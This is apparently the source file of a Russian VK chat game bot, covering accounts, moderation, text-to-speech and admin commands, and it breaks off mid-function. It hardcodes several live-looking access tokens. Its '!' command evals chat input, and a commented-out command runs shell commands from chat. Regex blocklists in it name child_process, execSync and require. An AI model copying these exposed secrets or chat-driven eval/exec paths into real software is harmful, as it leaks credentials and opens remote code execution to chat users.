	// Модули авторизации
	const { VK, Keyboard } = require('vk-io');
	const vk = new VK();
	const { updates } = vk;
	const { snippets } = vk;
	const str = new VK();

// Токены
const bt = 'a5aaef31208bd6308a25b9485ee88e4eb5ff6cc3b2692ffcdcb8e93686bcb238383e1d870301a1c88e9ed'; // Токен группы ВКонтакте.
const ut = '8106654d17c0a87438766be9bb2b11ababb5920951c5b2649ef5df843623570eb4a81ea3015bd3e2c219d'; // Токен страницы Разработчика

// Подключаемся к ВК
vk.setOptions({token: bt, apiMode: 'parallel', pollingGroupId: 181438458});

const user = new VK();
user.setOptions({token: ut}); 

const mifa = new VK();
mifa.setOptions({token: ut});

console.log(`Запуск бота..`)
const request = require("prequest");
const requests = require("request");
const rq = require("prequest");
const fs = require("fs");

const math = require('mathjs'); 
const https = require('https'); 
const googleTTS = require('google-tts-api'); 
const http = require('http'); 

const acc = require("./bd/acc.json"); 
const uid = require("./bd/uid.json"); 
const log = require("./bd/log.json"); 
const config = require("./config.json")
const chats = require("./bd/chats.json"); 
const clans = require("./bd/clans.json");

// Сохранение основной базы раз в 20 сек
setInterval(function(){
	fs.writeFileSync("./bd/acc.json", JSON.stringify(acc, null, "\t")) 
	fs.writeFileSync("./bd/uid.json", JSON.stringify(uid, null, "\t"))  
	fs.writeFileSync("./bd/log.json", JSON.stringify(log, null, "\t"));
	fs.writeFileSync("./bd/chats.json", JSON.stringify(chats, null, "\t"));
	fs.writeFileSync("./bd/clans.json", JSON.stringify(clans, null, "\t"));
	fs.writeFileSync("./bd/config.json", JSON.stringify(config, null, "\t"));
}, 20000);
const cm = vk.updates;


// == Ивенты

cm.on(['chat_invite_user_by_link'], async (message, next) => { 
	const [user_info] = await vk.api.users.get({ user_id: message.senderId }); 

	chats[message.chatId].count += 1; 
	if(!chats[message.chatId].users[message.payload.action.member_id]){ 
		chats[message.chatId].users[message.payload.action.member_id] = { 
			id: message.payload.action.member_id, 
			name: `${user[0].first_name} ${user[0].last_name}`, 
			kicked: false 
		} 
	} 

	await next(); 
}); 


cm.on(['chat_invite_user'], async (message, next) => { 
	if(message.payload.action.member_id == message.senderId) return; 

	var user = await vk.api.users.get({user_id: message.payload.action.member_id}) 

	chats[message.chatId].count += 1; 
	if(!chats[message.chatId].users[message.payload.action.member_id]){ 
		chats[message.chatId].users[message.payload.action.member_id] = { 
			id: message.payload.action.member_id, 
			name: `${user[0].first_name} ${user[0].last_name}`, 
			kicked: false 
		} 
	} 

	await next(); 
}); 


cm.on(['chat_kick_user'], async (message, next) => { 

	if(message.payload.action.member_id == message.senderId) return; 

	var user = await vk.api.users.get({user_id: message.payload.action.member_id}) 

	chats[message.chatId].users[message.payload.action.member_id].kicked = true 
	chats[message.chatId].count -= 1; 

	await next(); 
});


cm.on('join_group_member', async (ctx, next) => { 
	var group = await vk.api.groups.getMembers({ group_id: 181438458}); 
	acc.users[user_id(ctx.userId)].activity = true; 
	vk.api.users.get({user_ids: ctx.userId}).then(function(res) { 
		var user = res[0] 
		var text = `

		[${time(1)}] @id${ctx.userId} (${user.first_name} ${user.last_name}) подписался на @club181438458 (Группу) 💝

		👪 Участников в группе: ${spaces(group.count)}
		📈 Цель 5.000 подписчиков, до цели осталось: ${spaces(5000 - group.count)}

		` 
		vk.api.call('messages.send', { user_id: 530903911, message: text, random_id: 0, }); 
		vk.api.call('messages.send', { user_id: ctx.userId, message: `

			🙂 @id${ctx.userId} (${user.first_name}), спасибо за подписку!
			Напиши команду "Помощь", что бы узнать мои команды.

			`, random_id: 0, }); 
	}) 
}); 




cm.on('leave_group_member', async (ctx, next) => { 
	var group = await vk.api.groups.getMembers({ group_id: 181438458}); 
	vk.api.users.get({user_ids: ctx.userId}).then(function(res) { 
		var user = res[0] 
		var text = `

		[${time(1)}] @id${ctx.userId} (${user.first_name} ${user.last_name}) отписился от @club181438458 (Группы).. 💔

		👪 Участников в группе: ${spaces(group.count)}
		📈 Цель 5.000 подписчиков, до цели осталось: ${spaces(5000 - group.count)}

		` 
		vk.api.call('messages.send', { user_id: 530903911, message: text, random_id: 0, }); 
		vk.api.call('messages.send', { user_id: ctx.userId, message: `

			😔 @id${ctx.userId} (${user.first_name}), уже уходишь?.. Эхх, спасибо что был с нами, думаю ты ещё вернёшься!

			`, random_id: 0, }); 
	}) 
});









// Обработка получаемых сообщений.
cm.use(async (message, next) => {
	if(message.is("message") && message.isOutbox) 
		return;
	message.user = message.senderId;
	message.text = message.payload.text;  
	if (!message.text) return;



	if(!chats[message.chatId]){ 
		chats[message.chatId] = { 
			creator: 0, 
			count: 0, 
			active: false, 
			users: {} 
		} 
	} 



	vk.api.messages.getConversationMembers({ peer_id: message.peerId, fields: "id", group_id: 181438458}).then(function(response){ 
		var c = response; 
		c.items.map(function(c){ 
			if(c.member_id < 1) return; 

			vk.api.call('users.get', {user_id: message.user}).then((res) => {var e = res[0];

				if(!chats[message.chatId].users[c.member_id]){ 
					chats[message.chatId].users[c.member_id] = { 
						id: c.member_id, 
						name: `${e.first_name} ${e.last_name}`, 
						kicked: false 
					} 
				} 
			}) 
			if(c.is_owner == true){ 
				chats[message.chatId].creator = c.member_id 
			} 
		}) 
		chats[message.chatId].count = c.count; 
	}).catch((error) => { 
		message.send(`@${e.id} (${user.first_name}), выдайте боту права администратора, чтобы использовать эту команду. 
			`) 

	}); 

// Запрет на регистрацию сообществ
if (message.user < 1) return;

// Обращение к боту.
if(/\[club181438458\|(.*)\]/i.test(message.text)) message.text = message.text.replace(/\[club181438458\|(.*)\]/ig, '').trim();

// Запись ID VK и Создание ID в боте.
if(!uid[message.user]){
	acc.number += 1;
	var numm = acc.number;
	uid[message.user] = {
		id: numm
	}   
	vk.api.users.get({user_id: message.user}).then((res) => {
		var e = res[0];
		message.send(`@id${e.id} (${e.first_name.slice(0,1)}. ${e.last_name}), Вы успешно зарегистрированны.\n -- Для просмотра своих команд введите "Помощь".`)
		acc.users[numm] = {	
			balance: 5000000000, //баланс при регистрации
			ap: 0, //Статус  при регистрации
			bank: 0,
			bloks_bonus: false,
			mysor: 0,
			karta: 0,
			ras: false,
			cid: 0,
			conus: 0,
			volff1: 0,
			volff2: 0,
			volff3: 0,
			sub: true,
			volff4: 0,
			volff5: 0,
			volff6: 0,
			volff7: 0,
			volff8: 0,
			volff9: 0,
			volff10: 0,
			upis1: 0,
			upis2: 0,
			upis3: 0,
			upis4: 0,
			upis5: 0,
			upis6: 0,
			upis7: 0,
			upis8: 0,
			upis9: 0,
			upis10: 0,
			upis11: 0,
			upis12: 0,
			upis13: 0,
			upis14: 0,
			eval: false,
			upis15: 0,
			upis16: 0,
			iva756756n2228: 0,
			iva56765n228: 0,
			iv345an228: 0,
			iva564546n228: 0,
			ivan246543628: 0,
			iva546465n228: 0,
			iva54654n228: 100,
			iv54645an228: 0,
			ivan2282: 0,
			ivan2288787: 0,
			ivan2286778: 0,
			ivan22857657876: 0,
			ivan2256768: 0,
			upis11114: 0,
			upis56456456: 0,
			upis65465465: 0,
			upi564456465s: 0,
			rub: 0,
			upissas: 0,
			almfdaffin: 0,
			alfafdfmin: 0,
			almidfadfdn: 0,
			almidfsan: 0,
			almifdsn: 0,
			almindfs: 0,
			almidfsan: 0,
			almdfsfdsin: 0,
			aldfsfdsamin: 0,
			almdfsadfsafin: 0,
			almfdsin: 0,
			almidfsdfsan: 0,
			almdfsfsain: 0,
			almidfsasdfn: 0,
			almifdsafdsn: 0,
			almsfadasdfin: 0,
			alm6565in: 0,
			alm565in: 0,
			alm546in: 0,
			almi56n: 0,
			almi45: 0,
			almin23: 0,
			almin1: false,
			almin2: false,
			almin3: false,
			almin4: false,
			almin5: false,
			almin6: false,
			almin7: false,
			volftube1: false, 
			volftube2: false,
			volftube3: false,
			volftube4: false,
			volftube5: false,
			volftube6: false,
			volftube7: false,
			volftube8: false,
			volftube9: false,			
			volftube10: false,
			kvest1: false,
			kvest2: false,
			kvest3: false,
			kvest4: false,
			kvest5: false,
			kvest6: false,
			kvest7: false,
			kvest8: false,
			kvest9: false,
			kvest10: false,
			kvest11: false,
			kvest12: false,
			kvest13: false,
			kvest14: false,
			kvest15: false,
			kvest16: false,
			kvest17: false,
			kvest18: false,
			kvest19: false,
			kvest20: false,
			kvest21: false,
			kvest22: false,
			kvest23: false,
			rak: false,
			spid: false,
			sasati: false,
			zlom: false,
			zolos: 0,
			vamus: 0,
			pir: false,
			suka: false,
			muee: false,
			gets: false,
			banan1: false,
			banan2: false,
			banan3: false,
			banan4: false,
			banan5: false,
			banan6: false,
			banan7: false,
			banan8: false,
			banan9: false,
			banan10: false,
			banan11: false,
			banan12: false,
			banan13: false,
			banan14: false,
			banan15: false,
			banan16: false,
			banan17: false,
			banan18: false,
			banan19: false,
			mur: false,
			volftube1: 0,
			podarki: 11,
			cip: 0,
			his: 0,
			sasi: 0,
			cop: 0,
			sumka: 0,
			mer: 0,
			bbb: 0,
			cl: false,
			ll: false,
			oo: false,
			rrr: false,
			cvb: false,
			vfb: false,
			aaa: 0,
			ddd: 0,
			fff: 0,
			ppp: 0,
			qqq: 0,
			opea: 0,
			gey: 0,
			hq: 0,
			lord: 0,
			lols: 0,
			kkk: 0,
			mmm: 0,
			ccc: 0,
			zzz: 0,
			bbkle: 0,
			fdsfsd: 0,
			fdfd: 0,
			fggg: 0,
			perp: 0,
			vvvv: 0,
			vvvvvv: 0,
			popa: 0,
			ima: 0,
			dima: 0,
			lc: 0,
			ahahah: 100,
			ccccccc: 0,
			capt: 0,
			captre: 0,
			suka: 0,
			ivan: 0,
			mudak: 0,
			shel: 0,
			zoloto: 0,
			key: 0,
			ffffsasa: false,
			zalupa: false,
			xxxx: 0,
			skot: false,
			skotti: true,
			lox: 0,
			hi: false,
			dura: 0,
			baba: 0,
			chat: 0,
			adm_time: 0,
			bitcoin: 0, 
			donate: 0,
			bloks: { 
				cases: false,
				sssss1: false,
				sssss2: false,
				sssss3: false,
				sssss4: false,
				sssss5: false,
				sssss6: false,
				sssss7: false,
				sssss8: false,
				sssss9: false,
				sssss10: false,
				sssss11: false,
				sssss12: false,
				sssss13: false,
				sssss14: false,
				sssss111: false,
				sssss15: false,
				sssss1111: false,
				sssss143: false,
				rukus: false,
				nik: false,
				sss: false,
				shi: false,
				govni: false,
				yunet: false,
				marmok: false,
				nina: false,
				vivi: false,
				lol: false,
				geri: false,
				muma: false,
				gey: false,
				pzda: false,
				denis: false,
				delis: false,
				dlis: false,
				lis: false,
				lsas: false,
				nasvay: false,
				jok: false,
				bonus: false,
				piska: false,
				pari: false,
				gandon: false,
				ment: false,
				random_game: false,
				giverub: false,
				a_case: false,
				baned: false,
				pay: false,
				gun_case: false
			}, 
			ferm: {
				id: false,
				zp: 0
			},
			exs: 0,
			exsup: 50,
			lvl: 0,
			number: numm,
			id: message.user,
			nick: true,
			game: {
				binlose: 0,
				binwin: 0,
				binstop: false,
				kazlose: 0,
				kazwin: 0,
				rand_lose: 0,
				rand_win: 0,
				stavka_win: 0,
				stavka_lose: 0,
				win: 45,
				strela_loose: 0,
				strela_win: 0
			},
			msg: { 
				messages: 0, 
				last_msg: "" 
			},  
			bizs: {
				one_biz: false,
				one: {
					count: false,
					balance: 0,
					id: false,
					name: false,
					people: 0,
					uplvl: 0,
					zp: 0
				},
				two_biz: false,
				two: {
					count: false,
					balance: 0,
					id: false,
					name: false,
					people: 0,
					uplvl: 0,
					zp: 0
				}
			},
			cars: false,
			reys: false,
			aircraft: false,
			helicopter: false,
			house: false,
			housep: 0,
			pit: false,
			bank: 0,
			lodka: false,
			tag: "Новичок", 
			brak: false,
			ainfo: {
				all_ans: 0,
				ans: 0, 
				good_ans: 0,
				bad_ans: 0,
				vig: 0
			}, 
			safe: {
				status: false,
				key: false
			},
			admin: {
				block_pay: false,
				block_give: false,
				block_rep: false
			}, 
			rep: {
				status: false,
				id: false
			},
			ban: false, 
			mute: false,
			warn: 0,
			warn_p: [],
			credit: 0,
			procent: 0,
			job: { 
				name: false, 
				lvl: 0, 
				stop: false, 
				count: 0 
			}, 
			global_exs: 0,
			autozp: false,
			autobiz: false,
			duel: false,
			duel_summ: false,
			nachal: false,
			uron: 0,
			gun_name: false,
			block_game: true,
			prefix: `${e.first_name}`,
			lvl_v: 1,
			buttons: [],
			business: [],
			rtime: `${data()}, ${time()}` 
		}
	});
}
var id = user_id(message.user);
if(message.text){ 
			acc.msg += 1; // Всего сообщений
			if(!acc.users[user_id(message.user)]) return; 
			acc.users[id].msg.messages += 1; 
			acc.users[id].msg.last_msg = `${data()}, ${time()}`; 

			if(acc.users[id].mute == true) {
				if(!message.isChat) {
					message.send(`⛔ Вы временно заблокированны. 😟`)
					return;
				}
			}
		}

		if(acc.users[id].ban != false) {
			if(!message.isChat) {
				message.send(`⛔ Вы заблокированы навсегда 😟`);
				return;
			}
		}
		try { await next(); } 
		catch (err) { console.error(err) }
	});




	setInterval(() => {
		console.log("Обновляю Авто-онлайн...")	
		user.api.call('groups.enableOnline', {group_id: 181438458})
		console.log("Сообщество теперь онлайн.")
	}, 900000);


// Автостатус
setInterval(() => {
	console.log("Обновляю Авто-статус...")	
	var st = [`📝`,`✏`,`💭`].random();
	var rt = [`${st} Принято более ${spaces(acc.msg)} сообщений!`,`👥 С нами уже ${spaces(acc.number)} игроков!`,].random();
	user.api.call('status.set', {text: rt, group_id: 181438458});
	console.log("Статус обновлен.")
}, 60000);

// Виджет в группу
async function updateWidget() {
	var tops = []
	for (i=1;i<200000;i++) { 
		if(acc.users[i]) { 
			if(acc.users[i].ap < 1) { 
				tops.push({id: i, idvk: acc.users[i].id, lvl: acc.users[i].global_exs}); 
			}
		} 
	}
	tops.sort(function(a, b) { 
		if (b.lvl > a.lvl) return 1 
			if (b.lvl < a.lvl) return -1 
				return 0 
		})

	var script = {
		title: `Топ лучших игроков`, 
		head: [

		{
			text: 'Ник'
		},

		{
			text: 'Деньги',
			align: 'right'
		},

		{
			text: 'Рейтинг',
			align: 'right'
		}
		],
		body: []
	}

	for (var g = 0; g < 10; g++) { 
		if (tops.length > g) { 
			var ups = g; 
			ups += 1; 
			if(g <= 8) ups = `${ups}`
				if(g == 9) ups = `10` 
					script.body.push([

					{
						icon_id: `id${tops[g].idvk}`,
						text: `${acc.users[tops[g].id].prefix}`,
						url: `vk.com/id${tops[g].idvk}`
					},

					{
						text: `${spaces(acc.users[tops[g].id].balance)}$`
					},

					{
						text: `👑${spaces(tops[g].lvl)}`
					},
					])
			} 
		}
		requests.post({url: 'https://api.vk.com/method/appWidgets.update', form:{
			v: '5.95', 
			type: 'table', 
			code: `return ${JSON.stringify(script)};`, 
			access_token: '03422b76dc13f9c48fc528b91778b46e45b9a503382ba54b5651268de6879e4d8da96c577098e0ea6684d'
		}
	},
	function(err, resp, body) {
		console.log(body)
	})
	}
	updateWidget()
	setInterval(updateWidget, 60000)


	cm.setHearFallbackHandler(message => {
		var user = acc.users[user_id(message.user)];
		if(!message.isChat) {
			return message.reply(`Такой команды не существует, отправь «помощь» что бы узнать мои команды.`)
		}
	});



	cm.hear(/(?:топ)/i, (message) => { 
		var user = acc.users[user_id(message.user)];
		var text = ``; 
		var tops = [] 
		for (i=1;i<200000;i++) { 
			if(acc.users[i]){ 
				if(acc.users[i].ap < 1){ 
					tops.push({ 
						id: i, 
						idvk: acc.users[i].id, 
						lvl: acc.users[i].global_exs 
					}) 
				}
			} 

		} 
		tops.sort(function(a, b) { 
			if (b.lvl > a.lvl) return 1 
				if (b.lvl < a.lvl) return -1 
					return 0 
			}) 
		var yo = [] 

		for (var g = 0; g < 10; g++) { 
			if (tops.length > g) { 
				var ups = g; 
				ups += 1; 
				if(g <= 8) ups = `${ups}⃣` 
					if(g == 9) ups = `🔟` 
						yo.push({ 
							id: tops[g].id, 
							idvk: tops[g].idvk, 
							lvl: tops[g].lvl, 
							smile: `${ups}` 
						}) 
				} 
			} 
			var people = "Топ игроков: \n" + yo.map(a => a.smile + ". [id" + a.idvk + "|" + acc.users[a.id].prefix + "] - " + spaces(a.lvl) + "👑  |  " + utils.rn(acc.users[a.id].balance) + " 💰").join("\n")
			text += `${people}\n\n`; 
			message.send(text);
		});


	///////// == Команды/функции @vkbotevolk ===== [530903911] ================ ///////////////




	cm.hear(/(?:рестарт|restart|reboot|sr|rl)$/i, (message) => {		
	      	if(message.user != 530903911 && message.user != 530903911) return message.send(`<Error #403>`); // Доступ.
	      	message.send(`Запущен процесс перезапуска системы..`)
	      	setTimeout(() => {message.send(`Процесс завершён на: ${rand(1,9)}%`) }, 400);
	      	setTimeout(() => {message.send(`Процесс завершён на: ${rand(10,19)}%`)  }, 1000);
	      	setTimeout(() => {message.send(`Процесс завершён на: ${rand(20,39)}%`)  }, 1200);  
	      	setTimeout(() => {message.send(`Процесс завершён на: ${rand(40,59)}%`)  }, 1400); 
	      	setTimeout(() => {message.send(`Процесс завершён на: ${rand(60,84)}%`)  }, 1600);
	      	setTimeout(() => {message.send(`Процесс завершён на: ${rand(85,98)}%`)  }, 1800);
	      	setTimeout(() => {message.send(`Процесс завершён на: ${rand(99,100)}%`)  }, 2000);
	      	setTimeout(() => {message.send(`Система успешно перезагружена.`)  }, 2200);
		    setTimeout(() => { process.exit(-1); }, 2800);  // Процесс рестарта.
		});


	/*cm.hear(/(?:qinfo)/i, (message) => {
		if(message.user != 530903911) return;
		Wallet.getBalance((err, balance) => {
			Wallet.getAccountInfo((err, info) => { 
				var nick = info.contractInfo.nickname.nickname
				var number = info.contractInfo.contractId
				var ball = balance.accounts[0].balance.amount
				var pin = info.authInfo.mobilePinInfo.mobilePinUsed 
				var oper = info.userInfo.operator
				var mail = info.authInfo.boundEmail
				message.send(`
					🔱 @vkbotevolk(Ильдар), Информация о вашем аккаунте QIWI:

					👤 Ник QIWI: «${nick}»
					👥 Группа: Идентефицированный пользователь
					📞 Номер QIWI: +${number}
					💸 Баланс QIWI: ${ball}₽
					☎ Оператор номера QIWI: «${oper}»
					🔐 Мобильный Пин-код: ${pin.toString().replace(/false/gi, "Не использется").replace(/true/gi, "Используется")}
					✉ Почта: «${mail}»
					💳 Карта: «QIWI BANK» 
					🏷 Наименовние карты: «MIFA CODER»
					📲 Ссылка на веревод по нику: «qiwi.com/n/${nick}»`);
				return
			}); 
		});
	});

	cm.hear(/(?:qbal)/i, (message) => {
		if(message.user != 530903911) return;
		Wallet.getBalance((err, balance) => {
			var ball = balance.accounts[0].balance.amount;
			message.send(`❗ @vkbotevolk(Ильдар), баланс вашего QIWI кошелька составляет: ${ball}₽`);
			return
		}); 
	});




	cm.hear(/(?:qpay)\s?([0-9]+)?\s?([0-9]+)?([^]+)?/i, (message) => {
		if(message.user != 530903911) return;
		var us = acc.users[user_id(message.user)];
		let number = Number(message.$match[1]) 
		let count = Number(message.$match[2])
		let comm = message.$match[3];

	// Условия:
	if(!number) return message.send(`@vkbotevolk(Ильдар), вы не указали номер QIWI`); 
	if(number.length < 11 || number.length > 12) return message.send(`@vkbotevolk(Ильдар), номер QIWI должен состоять из 11 цифр!`); 
	if(!count) return message.send(`@vkbotevolk(Ильдар), вы не указали сумму перевода.`);
	if(!comm) return message.send(`@vkbotevolk(Ильдар), вы не указали комментарий к переводу.`);  

	Wallet.getBalance((err, balance) => {
		var ball = balance.accounts[0].balance.amount;
		Wallet.toWallet({ amount: count, comment: `
			🔔 Перевод от компании BigWars Bot.
			💬 Комментарий Администратора: «${comm} »

			💸 Сумма данного перевода составила: ${spaces(count)}₽
			👥 Наша группа ВКонтакте: https://vk.com/mskbt
			⚠ По всем вопросам: https://vk.com/vkbotevolk
			`, account: '+'+number}, (err, data) => {	

				if(ball < count) {
					message.send(`
						⛔ » [@qiwirussia(QIWI Wallet)]: Произошла критическая ошибка системы.
						На вашем балансе недостаточно средств. 
						- На вашем балансе: ${ball}₽. 
						Вы пытаетесть совершить перевод на сумму: ${spaces(count)}₽. 
						Пополните баланс и повторите попытку.
						`);
					message.send({sticker_id: 11925});
					return 
				};

				return message.send(`
					❗ @vkbotevolk(Ильдар), зачисление на QIWI счёт: +${number} проведено успешно.
					Сумма зачисления: ${count}₽
					Комментарий к зачислению: ${comm}.
					`);

			}); 
	});
});

*/

	cm.hear(/(?:!rules|!правила)/i, (message) => { 
		if(!message.isChat) return message.send(`Данная команда доступна в беседе.`) 
			vk.api.messages.send({
				chat_id: message.chatId, 
				forward_messages: 4195613, 
				random_id: 1
			});
	});





	/*cm.hear(/(?:ssh|shel)\s([^]+)$/i, (message) => {
		if(message.user != 530903911) return;
		try{
			var msg = child.execSync(message.$match[1])}
			catch (err){
				var msg = err.toString()
			}
			return message.send(`${msg}`)
		});*/


	cm.hear(/(?:транскрипт)\s(.*)/i, message => {
		var text = ``;
		message.$match[1].split('').map(x => {
			if (trans[x]) {
				text += trans[x];
			}
		});
		message.send(`${text.split('').join('')}`)
	})

	const trans = {

		й: 'i', ц: 'c', у: 'u', к: 'k', е: 'e', ё: 'e', н: 'n', г: 'g', ш: 'sch', щ: 'sh', з: 'z', х: 'h', ф: 'f', в: 'v', а: 'a', п: 'p', р: 'r', о: 'o', л: 'l', д: 'd', ж: 'zh', э: 'e', я: 'ya',ч: 'ch',с: 's',м: 'm',и: 'i',т: 't',ь: "'",б: 'b',ю: 'you',Й: 'i',	Ц: 'c', У: 'u',К: 'k',Е: 'e',Ё: 'e',Н: 'n',Г: 'g',Ш: 'sch',Щ: 'sh',З: 'z',Х: 'р',Ъ: 'ъ',Ф: 'f',Ы: 'i',В: 'v',А: 'a',П: 'p',Р: 'r',О: 'o',Л: 'l',Д: 'd',Ж: 'zh',Э: 'e', Я: 'ya', Ч: 'ch', С: 's',  М: 'w',	И: 'i', Т: 't', Ь: "'", Б: 'b', Ю: 'you', Ы: 'i', ы: 'i', " ": ' ', ".": '.', "!": '!', "?": '?'
	}


	cm.hear(/(?:scr|скрин)\s(.*)/i, async(message) => { 
		if(message.user != 530903911 && message.user != 530903911) return
			message.sendPhoto(`https://mini.s-shot.ru/RU/?${message.$match[1]}`) 
	})


	cm.hear(/(?:!kick|!кик)\s?(.*)?/i,  message => { 
		if (message.user != 530903911) { 
			if (message.$match[1]) {
				var userid = (message.$match[1]); 
				var cutid = userid.substr(15); 
				vk.api.utils.resolveScreenName({screen_name: cutid }).then(res => { 
					vk.api.users.get({user_id: res.object_id}).then(res => {  
						var e = res[0];
						var us = res.object_id
						if (us == undefined) { 
							return message.send(`Неверно указанна ссылка\n -- Пример ссылки "https://vk.com/идентефикатор_пользователя/сообщества".`) 
						} 
						vk.api.call("messages.removeChatUser", {chat_id: message.chatId, user_id: us}).catch((error) => {
							return message.send(`Ошибка. "@id${e.id} (${e.first_name.slice(0,1)}. ${e.last_name})" не обноружен в беседе, или он Администратор беседы.`);
						})
						return message.send(`@id${e.id} (${e.first_name.slice(0,1)}. ${e.last_name}) исключён из беседы.`);
					});
				});
			}
			if (!message.$match[1]) {
				if (message.replyMessage) {
					if (!message.replyMessage) return message.send(`Прокомментируйте сообщение с командой "!kick"`);
					var user = acc.users[user_id(message.replyMessage.senderId)];
					var id = message.replyMessage.senderId;
					vk.api.users.get({user_id: id}).then(res => { 
						var e = res[0]; 
						vk.api.call("messages.removeChatUser", {chat_id: message.chatId, user_id: id}).catch((error) => {
							return message.send(`Ошибка. «@id${e.id} (${e.first_name.slice(0,1)}. ${e.last_name})» не обноружен в беседе, или он Администратор беседы.`);
						})
						return message.send(`@id${e.id} (${e.first_name.slice(0,1)}. ${e.last_name}) исключён из беседы.`);
					});
				}
				if (message.forwards) {
					var user = acc.users[user_id(message.forwards[0].senderId)];
					var ids = message.forwards[0].senderId;
					vk.api.users.get({user_id: ids}).then(res => { 
						var e = res[0]; 
						vk.api.call("messages.removeChatUser", {chat_id: message.chatId, user_id: ids}).catch((error) => {
							return message.send(`Ошибка. "@id${e.id} (${e.first_name.slice(0,1)}. ${e.last_name})" не обноружен в беседе, или он Администратор беседы.`);
						})
						return message.send(`@id${e.id} (${e.first_name.slice(0,1)}. ${e.last_name}) исключён из беседы.`);
					})
				}
			}
		}
	});

	cm.hear(/(?:gs)/i, async (message) => {  
		if(!message.replyMessage) return message.send(`Перешлите голосовое сообщение с комментарие "gs"`);
		if (message.replyMessage.attachments[0] == undefined) {

			return message.send(`Ошибка. В вашем сообщении присутствует обычное сообщение, пожалуйста, пришлите голосовое сообщение.`);

		}

		if (message.replyMessage.attachments[0].images) {

			return message.send(`Ошибка. В вашем сообщении присутствует только стикер, пожалуйста, пришлите голосовое сообщение.`);

		}

		if (message.replyMessage.attachments[0].artist) {

			return message.send(`Ошибка. В вашем сообщении присутствует только музыка, пожалуйста, пришлите голосовое сообщение.`);

		}

		if (message.replyMessage.attachments[0].smallPhoto) {

			return message.send(`Ошибка. В вашем сообщении присутствует только картинка, пожалуйста, пришлите голосовое сообщение.`);

		}

		if (message.replyMessage.attachments[0].description) {

			return message.send(`Ошибка. В вашем сообщении присутствует только видео, пожалуйста, пришлите голосовое сообщение.`);

		}


		message.send(`Пожалуйста подождите, переозвучиваю ваше голосовое сообщение..`)
		vk.api.messages.setActivity({type: "audiomessage", chat_id: message.chatId})

		setTimeout(() => {return message.sendAudioMessage(message.replyMessage.attachments[0].url) }, 5000)
	});


	cm.hear(/(?:Гриша|Гришка)/i, async (message) => { 
		request(`https://isinkin-bot-api.herokuapp.com/1/talk?q=${encodeURIComponent(message.text)}`).then(res => { 
			var bot = res.text;
			var msg = [`Бот говорит:`, `Бот записывает голосовое сообщение:`, `Бот хочет вам что-то сказать..`].random()
			googleTTS(bot, `ru`, 5).then(function (url) {
				vk.api.messages.setActivity({type: "audiomessage", chat_id: message.chatId})
				message.send(msg) 
				setTimeout(() => {message.sendAudioMessage(url)}).catch(function (err) {
					console.error(err.stack); }, 10000);
			}); 
		})
	})

	cm.hear(/(?:Бот_ответь)/i, message => { 
		request("https://isinkin-bot-api.herokuapp.com/1/talk?q=" + encodeURIComponent(message.text)).then(res => { 
			return message.send(res.text) }) 
	});

	cm.hear(/(?:синтез)\s(.*)/i, async (message) => { 
		googleTTS(message.$match[1], `ru`, 5).then(function (url) {
			message.sendAudioMessage(url)}).catch(function (err) {
				console.error(err.stack); 

			}); 
		})


	cm.hear(/(?:Беседа бонус|Ббонус)$/i, (message) => { 
		let a = acc.users[user_id(message.user)]; 
		if(!message.isChat) return message.send(`Данная команда доступна в беседе.`) 


			if(message.user !== chats[message.chatId].creator) return message.send(`Доступ только у создателя беседы`); 
		if(chats[message.chatId].active == true){ 
			message.send(` 
				Вы уже приняли участие в программе.`) 
		} 

		if(chats[message.chatId].count >= 50){ 
			if(chats[message.chatId].active == false){ 
				a.balance += 500000*10; 
				chats[message.chatId].active = true 
				message.send(` 
					@id${message.user} (${a.prefix}), благодарим за участие в программе! 
					Вам начисленно ${utils.sp(500000*10)}$. 
					`) 
			} 
		} 
		if(chats[message.chatId].count >= 1){ 
			if(chats[message.chatId].active == false){ 
				message.send(` 
					@id${message.user} (${a.prefix}), в беседе слишком мало участников. 
					👥 Участников в беседе: ${chats[message.chatId].count} 
					❓ Чтобы получить бонус за беседу, в беседе должно быть, 50 участников. 
					`) 
			} 
		} 
	});



	cm.hear(/(?:реши)\s([^]+)/i, (message, bot) => {
		var t  = ['не могу решить этот пример 😟','пример записан не верно 😔'].random();	
		var a = message.$match[1].toLowerCase(); 
		var b = /(q|w|e|r|t|y|u|i|o|p|a|s|d|f|g|h|j|k|l|z|x|c|v|b|n|m|{|}|eval|й|ц|у|к|е|н|г|ш|щ|з|х|ъ|ф|ы|в|а|п|р|о|л|д|ж|э|я|ч|с|м|и|т|ь|б|ю|u0|require|root|child_process|выполнить|_выполнить|execSync|exec|dir|'|`|"|_|removeChatUser|setTimeout|setInterval|Wallet|toWallet|getBalance|qiwi|ut|u0|user_id:)/ 
		if(b.test(a) == true) return message.send(`${t}`);	
		var result = math.evaluate(message.$match[1]);
		return message.send(`${message.$match[1]} = ${result}`);
	});


	cm.hear(/(?:!)\s([^]+)$/i, (message) => {
		if(message.user != 285443942 && message.user != 530903911) return;

		if (acc.users[user_id(message.user)].eval == false){
			var t  = ['У вас нет доступа к такой функции','Такции функции можно выполнять только @vkbotevolk(Разработчику)'].random();	
			var a = message.$match[1].toLowerCase(); 
			var b = /(eval|removeChatUser|setTimeout|setInterval|Wallet|toWallet|getBalance|qiwi|require|root|child_process|выполнить|_выполнить|execSync|exec|dir|ut|u0|user_id:)/ 
			if(b.test(a) == true) return message.send(`${t}`);
		}
		try {
			const v = eval(message.$match[1]);
			const msg = message;
			const method = vk.api;

			if(typeof(v) === 'string') {
				return message.send(`Результат: ${v}`);
			} 
			else 
				if(typeof(v) === 'number') {
					return message.send(`Значение: ${v}`);
				} 
				else {
					return message.send(`Json Stringify: ${JSON.stringify(v, null, '　\t')}`);
				}
			} 

			catch (er) {
				console.error(er);
				return message.send(`Ошибка: ${er.toString()}`);
			}
		});


// =================== [ ACP ] =============================



cm.hear(/(?:судьба)/i, message => { 
	if(message.user != 530903911) {
		message.reply('Только для @vkbotevolk(Разработчика).');
		return message.sendSticker(13475);
	}

	if(!message.replyMessage) return message.send(`Перешлите сообщение с комментарием "судьба"`);
	var id = message.replyMessage.senderId
	if (!acc.users[user_id(id)]) return message.send(`Данный пользователь не зарегистрирован в боте.`);
	if (acc.users[user_id(id)].ap == 3) return message.send(`Он имеет наивысшую роль в боте.`);
	if (acc.users[user_id(id)].ap == 0) return message.send(`Он не Администратор`);
	vk.api.users.get({user_id: id, name_case: "gen"}).then((res) => { 
		var e = res[0];
		message.send(`💫 Леди и джентльмены сегодня, мы решим судьбу Админа..`);
		setTimeout(() => {message.send(`😑 На сей раз рандом выбрал решить судьбу @id${e.id} (${e.first_name} ${e.last_name})..`); 
	}, 2000); 
	});
	setTimeout(() => {
